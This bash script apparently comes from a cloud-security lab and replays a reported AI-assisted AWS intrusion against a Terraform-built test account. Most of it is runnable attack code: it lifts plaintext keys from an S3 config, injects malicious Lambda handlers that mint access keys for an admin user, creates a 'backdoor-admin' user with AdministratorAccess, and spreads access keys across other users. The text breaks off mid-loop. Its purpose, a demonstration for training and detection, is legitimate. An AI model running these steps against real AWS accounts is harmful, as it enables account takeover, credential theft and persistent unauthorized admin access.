#!/bin/bash

# Demo script for: AI-Assisted Cloud Intrusion: 8 Minutes to Admin
# Recreation of the Nov 2025 Sysdig TRT breach.
#
# Attack chain:
#   pl-prod-8min-starting-user
#   -> (s3:GetObject) private RAG bucket with embedded IAM credentials
#   -> pl-prod-8min-compromised-user
#   -> (lambda:UpdateFunctionCode + lambda:InvokeFunction) pl-prod-8min-ec2-init
#   -> (iam:CreateAccessKey via ec2-init-role) pl-prod-8min-frick (admin)
#   -> (iam:CreateUser + iam:AttachUserPolicy) backdoor-admin (AdministratorAccess)
#
# Source: https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes
# Authors: Alessandro Brucato and Michael Clark (Sysdig Threat Research Team)

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-8min-starting-user"
COMPROMISED_USER_NAME="pl-prod-8min-compromised-user"
FRICK_USERNAME="pl-prod-8min-frick"
EC2_INIT_FUNCTION_NAME="pl-prod-8min-ec2-init"

echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}AI-Assisted Cloud Intrusion: 8 Minutes to Admin${NC}"
echo -e "${GREEN}Sysdig TRT Attack Simulation${NC}"
echo -e "${GREEN}============================================================${NC}\n"
echo "Source: https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes"
echo ""

# Record start time for elapsed-time tracking
DEMO_START_TIME=$(date +%s)

# =============================================================================
# Phase 0: Retrieve credentials and configuration from Terraform
# =============================================================================
echo -e "${YELLOW}Phase 0: Retrieving scenario configuration from Terraform${NC}"
cd ../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.attack_simulation_sysdig_8_minutes_to_admin.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output 'attack_simulation_sysdig_8_minutes_to_admin'${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract starting user credentials from terraform output${NC}"
    exit 1
fi

# Extract scenario resource names (use Terraform values as ground truth)
RAG_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.rag_bucket_name')
EC2_INIT_FUNCTION=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_init_function_name')
FRICK_USERNAME=$(echo "$MODULE_OUTPUT" | jq -r '.frick_username')
COMPROMISED_USER=$(echo "$MODULE_OUTPUT" | jq -r '.compromised_user_name')

# Extract readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "RAG bucket: $RAG_BUCKET"
echo "EC2-init function: $EC2_INIT_FUNCTION"
echo "Target admin user: $FRICK_USERNAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_user_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during demo validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# =============================================================================
# Phase 1: Initial Access — leaked S3 credentials
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 1: Initial Access (T1552.001 — Credentials In Files)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

# [EXPLOIT] Configure AWS CLI with starting user credentials
echo -e "${YELLOW}The attacker has obtained credentials for pl-prod-8min-starting-user through an${NC}"
echo -e "${YELLOW}initial compromise (phishing, dark-web purchase, etc). They now verify identity${NC}"
echo -e "${YELLOW}and begin enumerating accessible resources.${NC}"
echo ""
use_starting_user_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker ($STARTING_USER)" "aws sts get-caller-identity"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi

# [OBSERVATION] Get account ID
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Confirmed starting user identity${NC}\n"

# [EXPLOIT] List the private RAG bucket
echo -e "${YELLOW}The attacker enumerates accessible S3 buckets. The starting user has s3:ListBucket${NC}"
echo -e "${YELLOW}on a private RAG data bucket used by the ML pipeline.${NC}"
echo ""
use_starting_user_creds
export AWS_REGION=$AWS_REGION

show_attack_cmd "Attacker ($STARTING_USER)" "aws s3 ls s3://$RAG_BUCKET/ --recursive"
aws s3 ls s3://$RAG_BUCKET/ --recursive

echo ""
echo -e "${GREEN}✓ Bucket listing succeeded — config/rag-pipeline-config.json is visible${NC}\n"

# [EXPLOIT] Download and inspect the config file
echo -e "${YELLOW}The attacker notices config/rag-pipeline-config.json — this looks like it may${NC}"
echo -e "${YELLOW}contain pipeline configuration including connection details or credentials.${NC}"
echo ""

show_attack_cmd "Attacker ($STARTING_USER)" "aws s3 cp s3://$RAG_BUCKET/config/rag-pipeline-config.json /tmp/rag-config.json"
aws s3 cp s3://$RAG_BUCKET/config/rag-pipeline-config.json /tmp/rag-config.json

echo ""
echo "Config file contents:"
cat /tmp/rag-config.json | jq .
echo ""

# [EXPLOIT] Extract credentials from config
echo -e "${YELLOW}The config file contains AWS credentials in plaintext — a developer left them${NC}"
echo -e "${YELLOW}with a TODO to move them to Secrets Manager. The attacker extracts them.${NC}"
echo ""

COMPROMISED_KEY_ID=$(jq -r '.aws_credentials.access_key_id' /tmp/rag-config.json)
COMPROMISED_SECRET_KEY=$(jq -r '.aws_credentials.secret_access_key' /tmp/rag-config.json)

if [ -z "$COMPROMISED_KEY_ID" ] || [ "$COMPROMISED_KEY_ID" == "null" ]; then
    echo -e "${RED}Error: Could not extract embedded credentials from config file${NC}"
    exit 1
fi

echo "Extracted Access Key ID: ${COMPROMISED_KEY_ID:0:10}..."
echo -e "${GREEN}✓ Extracted embedded IAM credentials from RAG config${NC}\n"

# [EXPLOIT] Switch to the compromised user
echo -e "${YELLOW}The attacker switches to the extracted credentials and verifies the new identity.${NC}"
echo ""
export AWS_ACCESS_KEY_ID="$COMPROMISED_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$COMPROMISED_SECRET_KEY"
unset AWS_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

show_cmd "Attacker ($COMPROMISED_USER)" "aws sts get-caller-identity"
COMPROMISED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Identity: $COMPROMISED_IDENTITY"
echo -e "${GREEN}✓ Now operating as $COMPROMISED_USER${NC}\n"

# =============================================================================
# Phase 2: Reconnaissance
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 2: Reconnaissance (T1087.004 — Cloud Accounts, T1613)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${DIM}[Elapsed: ${ELAPSED}s]${NC}\n"

echo -e "${YELLOW}The attacker (augmented by an AI assistant per the blog post) runs broad IAM${NC}"
echo -e "${YELLOW}enumeration to identify high-value targets. The compromised user has several${NC}"
echo -e "${YELLOW}helpful permissions that accelerate discovery.${NC}"
echo ""

# [EXPLOIT] List IAM users
show_cmd "Attacker ($COMPROMISED_USER)" "aws iam list-users"
aws iam list-users --output table 2>/dev/null || true
echo ""

# [EXPLOIT] Check frick's policies — identifies him as the admin target
echo -e "${YELLOW}The attacker lists attached policies for pl-prod-8min-frick — the AI flags this${NC}"
echo -e "${YELLOW}user as a high-value target due to the AdministratorAccess policy.${NC}"
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws iam list-attached-user-policies --user-name $FRICK_USERNAME"
aws iam list-attached-user-policies --user-name $FRICK_USERNAME --output table 2>/dev/null || true
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws iam list-access-keys --user-name $FRICK_USERNAME"
aws iam list-access-keys --user-name $FRICK_USERNAME --output table 2>/dev/null || true
echo ""

# [EXPLOIT] Lambda enumeration
echo -e "${YELLOW}The attacker enumerates Lambda functions, looking for execution roles with${NC}"
echo -e "${YELLOW}elevated permissions — a common source of privilege escalation.${NC}"
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws lambda list-functions --region $AWS_REGION --query 'Functions[*].[FunctionName,Role]' --output table"
aws lambda list-functions --region $AWS_REGION \
    --query 'Functions[*].[FunctionName,Role]' \
    --output table 2>/dev/null || true
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws lambda get-function --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --query 'Configuration.{Role:Role,Timeout:Timeout}'"
aws lambda get-function \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --query 'Configuration.{Role:Role,Timeout:Timeout}' \
    --output table 2>/dev/null || true
echo ""
echo -e "${GREEN}✓ Identified pl-prod-8min-ec2-init Lambda with a promising execution role${NC}\n"

# [EXPLOIT] Bedrock recon (mirrors AI reconnaissance from the blog)
echo -e "${YELLOW}The attacker (via AI assistant) enumerates Bedrock models and checks whether${NC}"
echo -e "${YELLOW}invocation logging is enabled — an important evasion check.${NC}"
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws bedrock list-foundation-models --region $AWS_REGION --query 'modelSummaries[*].[modelId,modelName]' --output table"
aws bedrock list-foundation-models \
    --region $AWS_REGION \
    --query 'modelSummaries[*].[modelId,modelName]' \
    --output table 2>/dev/null || echo "Bedrock: could not list models from this identity"
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws bedrock get-model-invocation-logging-configuration --region $AWS_REGION"
aws bedrock get-model-invocation-logging-configuration \
    --region $AWS_REGION 2>/dev/null || echo "Bedrock logging: not configured (or insufficient permissions to read)"
echo ""

# =============================================================================
# Phase 3: Role Guessing and Lateral Recon
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 3: Role Guessing (T1078.004 — Cloud Accounts)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${DIM}[Elapsed: ${ELAPSED}s]${NC}\n"

echo -e "${YELLOW}The AI assistant tries obvious admin role names — a hallmark of AI-assisted${NC}"
echo -e "${YELLOW}attacks. These role names do not exist in this account; both attempts fail.${NC}"
echo ""

# [EXPLOIT] Attempt common admin role names (expected to fail)
show_cmd "Attacker ($COMPROMISED_USER)" "aws sts assume-role --role-arn arn:aws:iam::${ACCOUNT_ID}:role/admin --role-session-name test"
aws sts assume-role \
    --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/admin" \
    --role-session-name "test" 2>&1 | grep -E "(AccessDenied|NoSuchEntity|is not authorized|Error)" | head -3 || true
echo -e "${DIM}(expected failure — role does not exist)${NC}\n"

show_cmd "Attacker ($COMPROMISED_USER)" "aws sts assume-role --role-arn arn:aws:iam::${ACCOUNT_ID}:role/Administrator --role-session-name test"
aws sts assume-role \
    --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/Administrator" \
    --role-session-name "test" 2>&1 | grep -E "(AccessDenied|NoSuchEntity|is not authorized|Error)" | head -3 || true
echo -e "${DIM}(expected failure — role does not exist)${NC}\n"

# [EXPLOIT] Assume the low-privilege roles that do exist
echo -e "${YELLOW}The attacker discovers and assumes three real low-privilege roles. These roles${NC}"
echo -e "${YELLOW}don't provide a direct path to admin but confirm lateral movement is possible.${NC}"
echo ""

show_cmd "Attacker ($COMPROMISED_USER)" "aws sts assume-role --role-arn arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-sysadmin-role --role-session-name explore"
SYSADMIN_CREDS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-sysadmin-role" \
    --role-session-name "explore" 2>/dev/null || echo "")
if [ -n "$SYSADMIN_CREDS" ]; then
    echo -e "${GREEN}✓ Assumed pl-prod-8min-sysadmin-role${NC}"
else
    echo -e "${DIM}pl-prod-8min-sysadmin-role: not assumable${NC}"
fi

show_cmd "Attacker ($COMPROMISED_USER)" "aws sts assume-role --role-arn arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-developer-role --role-session-name test"
DEVELOPER_CREDS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-developer-role" \
    --role-session-name "test" 2>/dev/null || echo "")
if [ -n "$DEVELOPER_CREDS" ]; then
    echo -e "${GREEN}✓ Assumed pl-prod-8min-developer-role${NC}"
else
    echo -e "${DIM}pl-prod-8min-developer-role: not assumable${NC}"
fi

show_cmd "Attacker ($COMPROMISED_USER)" "aws sts assume-role --role-arn arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-account-role --role-session-name pwned"
ACCOUNT_CREDS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-account-role" \
    --role-session-name "pwned" 2>/dev/null || echo "")
if [ -n "$ACCOUNT_CREDS" ]; then
    echo -e "${GREEN}✓ Assumed pl-prod-8min-account-role${NC}"
else
    echo -e "${DIM}pl-prod-8min-account-role: not assumable${NC}"
fi

echo ""
echo -e "${DIM}None of these low-privilege roles provide a path to admin. Returning to${NC}"
echo -e "${DIM}compromised user credentials to pursue the Lambda injection vector.${NC}\n"

# Restore compromised user credentials for the main attack
export AWS_ACCESS_KEY_ID="$COMPROMISED_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$COMPROMISED_SECRET_KEY"
unset AWS_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

# =============================================================================
# Phase 4: Lambda Code Injection — Attempt 1 (targets admingh, fails)
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 4: Lambda Code Injection Attempt 1 — Wrong Target${NC}"
echo -e "${BLUE}(T1648 — Serverless Execution)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${DIM}[Elapsed: ${ELAPSED}s]${NC}\n"

echo -e "${YELLOW}The attacker's AI assistant identifies Lambda code injection as a privilege${NC}"
echo -e "${YELLOW}escalation path. The first attempt targets pl-prod-8min-admingh — a user the${NC}"
echo -e "${YELLOW}AI guesses may have admin access based on the name pattern. The technique works${NC}"
echo -e "${YELLOW}technically, but admingh has no useful policies attached.${NC}"
echo ""

# Create malicious payload targeting admingh
cat > /tmp/malicious_handler_v1.py << 'PYTHON'
import boto3
import json

def handler(event, context):
    iam = boto3.client('iam')
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    try:
        key = iam.create_access_key(UserName='pl-prod-8min-admingh')
        policies = iam.list_attached_user_policies(UserName='pl-prod-8min-admingh')
        return {
            'statusCode': 200,
            'body': json.dumps({
                'identity': identity['Arn'],
                'target': 'pl-prod-8min-admingh',
                'access_key_id': key['AccessKey']['AccessKeyId'],
                'secret_access_key': key['AccessKey']['SecretAccessKey'],
                'policies': [p['PolicyName'] for p in policies['AttachedPolicies']]
            })
        }
    except Exception as e:
        return {'statusCode': 500, 'body': json.dumps({'error': str(e)})}
PYTHON

cd /tmp && zip -q malicious_lambda_v1.zip malicious_handler_v1.py && cd - > /dev/null
echo "Created malicious payload: /tmp/malicious_lambda_v1.zip"
echo ""

show_attack_cmd "Attacker ($COMPROMISED_USER)" "aws lambda update-function-code --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --zip-file fileb:///tmp/malicious_lambda_v1.zip"
aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --zip-file fileb:///tmp/malicious_lambda_v1.zip > /dev/null

show_attack_cmd "Attacker ($COMPROMISED_USER)" "aws lambda update-function-configuration --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --handler malicious_handler_v1.handler --timeout 30"
aws lambda update-function-configuration \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --handler malicious_handler_v1.handler \
    --timeout 30 > /dev/null

echo ""
echo -e "${YELLOW}Waiting 15 seconds for Lambda update to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Lambda updated${NC}\n"

show_attack_cmd "Attacker ($COMPROMISED_USER)" "aws lambda invoke --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --payload '{}' /tmp/lambda_response_v1.json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --payload '{}' \
    /tmp/lambda_response_v1.json > /dev/null

echo "Lambda response (attempt 1):"
cat /tmp/lambda_response_v1.json | jq . 2>/dev/null || cat /tmp/lambda_response_v1.json
echo ""

# Evaluate the result
ADMINGH_POLICIES=$(cat /tmp/lambda_response_v1.json | jq -r '.body | fromjson | .policies | length' 2>/dev/null || echo "0")
ADMINGH_KEY_ID=$(cat /tmp/lambda_response_v1.json | jq -r '.body | fromjson | .access_key_id' 2>/dev/null || echo "")

echo -e "${RED}✗ Attempt 1 failed to yield admin access — pl-prod-8min-admingh has no attached policies${NC}"
echo "Attached policies: $ADMINGH_POLICIES"
echo ""

# Clean up the useless admingh key immediately
if [ -n "$ADMINGH_KEY_ID" ] && [ "$ADMINGH_KEY_ID" != "null" ]; then
    echo "Deleting useless access key for pl-prod-8min-admingh: $ADMINGH_KEY_ID"
    aws iam delete-access-key \
        --user-name pl-prod-8min-admingh \
        --access-key-id "$ADMINGH_KEY_ID" 2>/dev/null || true
    echo -e "${DIM}(cleaned up dead-end credential)${NC}\n"
fi

# =============================================================================
# Phase 5: Lambda Code Injection — Attempt 2 (targets frick, succeeds)
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 5: Lambda Code Injection Attempt 2 — The 8-Minute Moment${NC}"
echo -e "${BLUE}(T1648 + T1098.001 — Serverless Execution + Additional Cloud Credentials)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${DIM}[Elapsed: ${ELAPSED}s]${NC}\n"

echo -e "${YELLOW}The attacker pivots to target pl-prod-8min-frick — the user confirmed during${NC}"
echo -e "${YELLOW}recon as having AdministratorAccess. The same Lambda injection technique is${NC}"
echo -e "${YELLOW}redeployed with the correct target username.${NC}"
echo ""

cat > /tmp/malicious_handler_v2.py << 'PYTHON'
import boto3
import json

def handler(event, context):
    iam = boto3.client('iam')
    sts = boto3.client('sts')
    s3 = boto3.client('s3')
    identity = sts.get_caller_identity()
    users = iam.list_users()
    key = iam.create_access_key(UserName='pl-prod-8min-frick')
    policies = iam.list_attached_user_policies(UserName='pl-prod-8min-frick')
    buckets = s3.list_buckets()
    return {
        'statusCode': 200,
        'body': json.dumps({
            'identity': identity['Arn'],
            'target': 'pl-prod-8min-frick',
            'access_key_id': key['AccessKey']['AccessKeyId'],
            'secret_access_key': key['AccessKey']['SecretAccessKey'],
            'attached_policies': [p['PolicyName'] for p in policies['AttachedPolicies']],
            'all_users': [u['UserName'] for u in users['Users']],
            'buckets': [b['Name'] for b in buckets['Buckets']]
        })
    }
PYTHON

cd /tmp && zip -q malicious_lambda_v2.zip malicious_handler_v2.py && cd - > /dev/null
echo "Created malicious payload: /tmp/malicious_lambda_v2.zip"
echo ""

show_attack_cmd "Attacker ($COMPROMISED_USER)" "aws lambda update-function-code --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --zip-file fileb:///tmp/malicious_lambda_v2.zip"
aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --zip-file fileb:///tmp/malicious_lambda_v2.zip > /dev/null

show_attack_cmd "Attacker ($COMPROMISED_USER)" "aws lambda update-function-configuration --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --handler malicious_handler_v2.handler --timeout 30"
aws lambda update-function-configuration \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --handler malicious_handler_v2.handler \
    --timeout 30 > /dev/null

echo ""
echo -e "${YELLOW}Waiting 15 seconds for Lambda update to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Lambda updated${NC}\n"

show_attack_cmd "Attacker ($COMPROMISED_USER)" "aws lambda invoke --region $AWS_REGION --function-name $EC2_INIT_FUNCTION --payload '{}' /tmp/lambda_response_v2.json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $EC2_INIT_FUNCTION \
    --payload '{}' \
    /tmp/lambda_response_v2.json > /dev/null

echo "Lambda response (attempt 2):"
cat /tmp/lambda_response_v2.json | jq . 2>/dev/null || cat /tmp/lambda_response_v2.json
echo ""

# Extract frick's credentials from the Lambda response
FRICK_KEY_ID=$(cat /tmp/lambda_response_v2.json | jq -r '.body | fromjson | .access_key_id' 2>/dev/null || echo "")
FRICK_SECRET_KEY=$(cat /tmp/lambda_response_v2.json | jq -r '.body | fromjson | .secret_access_key' 2>/dev/null || echo "")

if [ -z "$FRICK_KEY_ID" ] || [ "$FRICK_KEY_ID" == "null" ]; then
    echo -e "${RED}Error: Could not extract frick credentials from Lambda response${NC}"
    exit 1
fi

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${GREEN}✓ Admin credentials for $FRICK_USERNAME extracted successfully!${NC}"
echo -e "${CYAN}>>> Elapsed time: ${ELAPSED} seconds <<<${NC}"
echo -e "${CYAN}>>> This is the ~8-minute moment from the Sysdig blog post <<<${NC}\n"

# =============================================================================
# Phase 6: Admin Escalation and Persistence
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 6: Admin Escalation and Persistence${NC}"
echo -e "${BLUE}(T1078.004 + T1098.001 — Cloud Accounts + Additional Credentials)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

echo -e "${YELLOW}The attacker switches to frick's credentials to confirm admin access, then${NC}"
echo -e "${YELLOW}creates a persistent backdoor user with AdministratorAccess — matching the${NC}"
echo -e "${YELLOW}persistence technique documented in the Sysdig blog post.${NC}"
echo ""

# [EXPLOIT] Switch to frick's credentials
export AWS_ACCESS_KEY_ID="$FRICK_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$FRICK_SECRET_KEY"
unset AWS_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

echo -e "${YELLOW}Waiting 15 seconds for new credentials to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Credentials propagated${NC}\n"

show_cmd "Attacker ($FRICK_USERNAME)" "aws sts get-caller-identity"
FRICK_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Identity: $FRICK_IDENTITY"

if [[ ! $FRICK_IDENTITY == *"$FRICK_USERNAME"* ]]; then
    echo -e "${RED}Error: Failed to authenticate as $FRICK_USERNAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Now operating as $FRICK_USERNAME (Administrator)${NC}\n"

# [EXPLOIT] Identity spreading — assume roles across multiple sessions
echo -e "${YELLOW}The attacker spreads across multiple IAM roles, assuming each with different${NC}"
echo -e "${YELLOW}session names. This distributes operations across identities, complicating${NC}"
echo -e "${YELLOW}detection and establishing persistence across multiple principals.${NC}"
echo -e "${YELLOW}(Blog: \"6 roles across 14 sessions, 19 unique principals total\")${NC}"
echo ""

ROLE_SESSIONS=(
    "sysadmin:explore"
    "account:explore"
    "netadmin:explore"
    "sysadmin:test"
    "account:test"
    "netadmin:test"
    "developer:test"
    "external:test"
    "sysadmin:pwned"
    "account:pwned"
    "netadmin:pwned"
    "sysadmin:escalation"
)

ASSUMED_COUNT=0
for ROLE_SESSION in "${ROLE_SESSIONS[@]}"; do
    ROLE="${ROLE_SESSION%%:*}"
    SESSION="${ROLE_SESSION##*:}"
    ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/pl-prod-8min-${ROLE}-role"
    show_cmd "Attacker ($FRICK_USERNAME)" "aws sts assume-role --role-arn $ROLE_ARN --role-session-name $SESSION"
    if aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "$SESSION" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ Assumed pl-prod-8min-${ROLE}-role (session: $SESSION)${NC}"
        ASSUMED_COUNT=$((ASSUMED_COUNT + 1))
    else
        echo -e "${RED}✗ Failed: pl-prod-8min-${ROLE}-role (session: $SESSION)${NC}"
    fi
done

echo ""
echo -e "${GREEN}✓ Successfully assumed $ASSUMED_COUNT role sessions across 5 roles${NC}\n"

# Restore frick credentials after role assumption spreading
export AWS_ACCESS_KEY_ID="$FRICK_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$FRICK_SECRET_KEY"
unset AWS_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

# [EXPLOIT] Create persistent backdoor admin user
echo -e "${YELLOW}The attacker creates a backdoor admin user to maintain persistence even if${NC}"
echo -e "${YELLOW}frick's credentials are rotated — a technique highlighted in the blog post.${NC}"
echo ""

show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws iam create-user --user-name backdoor-admin"
aws iam create-user --user-name backdoor-admin

echo ""
echo -e "${YELLOW}Waiting 15 seconds for user creation to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ User created${NC}\n"

show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
aws iam attach-user-policy \
    --user-name backdoor-admin \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo ""
BACKDOOR_KEYS=$(aws iam create-access-key --user-name backdoor-admin)
BACKDOOR_KEY_ID=$(echo "$BACKDOOR_KEYS" | jq -r '.AccessKey.AccessKeyId')
BACKDOOR_SECRET=$(echo "$BACKDOOR_KEYS" | jq -r '.AccessKey.SecretAccessKey')

echo "Backdoor admin access key: $BACKDOOR_KEY_ID"
echo -e "${GREEN}✓ Backdoor admin user created with AdministratorAccess${NC}\n"

# [EXPLOIT] Create access keys for rocker (Bedrock persistence)
echo -e "${YELLOW}The attacker also creates access keys for pl-prod-8min-rocker — a user with${NC}"
echo -e "${YELLOW}Bedrock permissions — enabling continued unauthorized model invocations.${NC}"
echo ""

show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws iam create-access-key --user-name pl-prod-8min-rocker"
ROCKER_KEYS=$(aws iam create-access-key --user-name pl-prod-8min-rocker)
ROCKER_KEY_ID=$(echo "$ROCKER_KEYS" | jq -r '.AccessKey.AccessKeyId')
ROCKER_SECRET=$(echo "$ROCKER_KEYS" | jq -r '.AccessKey.SecretAccessKey')

echo "Rocker access key: $ROCKER_KEY_ID"
echo -e "${GREEN}✓ Access keys created for pl-prod-8min-rocker${NC}\n"

# [EXPLOIT] Create access keys for remaining pre-existing users (identity spreading)
echo -e "${YELLOW}The attacker creates access keys for four additional pre-existing users,${NC}"
echo -e "${YELLOW}spreading across identities to complicate tracking and ensure persistence.${NC}"
echo -e "${YELLOW}Only one active principal is needed to maintain access to the account.${NC}"
echo ""

TAKEOVER_USERS=("pl-prod-8min-azureadmanager" "pl-prod-8min-deploy-svc" "pl-prod-8min-monitoring" "pl-prod-8min-ci-runner")
TAKEOVER_KEY_IDS=()
for TAKEOVER_USER in "${TAKEOVER_USERS[@]}"; do
    show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws iam create-access-key --user-name $TAKEOVER_USER"
